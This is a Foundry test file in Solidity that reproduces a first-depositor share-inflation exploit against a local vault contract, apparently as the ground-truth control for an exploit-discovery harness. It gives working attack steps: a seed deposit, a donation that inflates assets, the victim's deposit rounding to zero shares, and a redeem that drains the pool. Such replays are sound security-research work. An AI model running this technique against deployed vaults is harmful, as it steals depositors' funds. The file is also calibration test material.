// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/MiniVault.sol";

/// Minimal mock ERC20 (mint/approve/transfer) for a self-contained, fork-free
/// replay — the calibration positive control runs locally (no archive RPC).
contract MockERC20 is IERC20 {
    mapping(address => uint256) public bal;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external { bal[to] += amount; }
    function balanceOf(address a) external view returns (uint256) { return bal[a]; }
    function approve(address s, uint256 amt) external returns (bool) {
        allowance[msg.sender][s] = amt;
        return true;
    }
    function transfer(address to, uint256 amt) external returns (bool) {
        bal[msg.sender] -= amt;
        bal[to] += amt;
        return true;
    }
    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (allowance[from][msg.sender] != type(uint256).max) {
            allowance[from][msg.sender] -= amt;
        }
        bal[from] -= amt;
        bal[to] += amt;
        return true;
    }
}

/// Reference exploit for the MiniVault first-depositor / donation share-inflation
/// bug — the calibration GROUND TRUTH. `testExploit` PASSES iff the attacker
/// steals the victim's principal, which is exactly the known-hack outcome the
/// harness must independently rediscover.
contract MiniVaultInflationReplay is Test {
    MockERC20 token;
    MiniVault vault;
    address attacker = address(0xA11CE);
    address victim = address(0xB0B);

    function setUp() public {
        token = new MockERC20();
        vault = new MiniVault(token);
        token.mint(attacker, 10 ether + 1);
        token.mint(victim, 10 ether);
    }

    function testExploit() public {
        // 1. Attacker seeds 1 wei (mints 1 share), then DONATES 10 ether directly
        //    to the vault — inflating totalAssets() with no new shares.
        vm.startPrank(attacker);
        token.approve(address(vault), type(uint256).max);
        vault.deposit(1, attacker);
        token.transfer(address(vault), 10 ether);
        vm.stopPrank();

        // 2. Victim deposits 10 ether → shares = 10e18 * 1 / 10e18+1 → rounds to 0.
        vm.startPrank(victim);
        token.approve(address(vault), type(uint256).max);
        uint256 victimShares = vault.deposit(10 ether, victim);
        vm.stopPrank();
        assertEq(victimShares, 0); // victim inflated to 0 shares

        // 3. Attacker redeems its 1 share → drains the whole (now ~20 ether) pool.
        vm.startPrank(attacker);
        uint256 before = token.balanceOf(attacker);
        vault.redeem(1, attacker);
        uint256 gained = token.balanceOf(attacker) - before;
        vm.stopPrank();

        // The attacker walks away with the victim's principal — the hack reproduced.
        assertGt(gained, 10 ether); // attacker stole the victim's deposit
    }
}
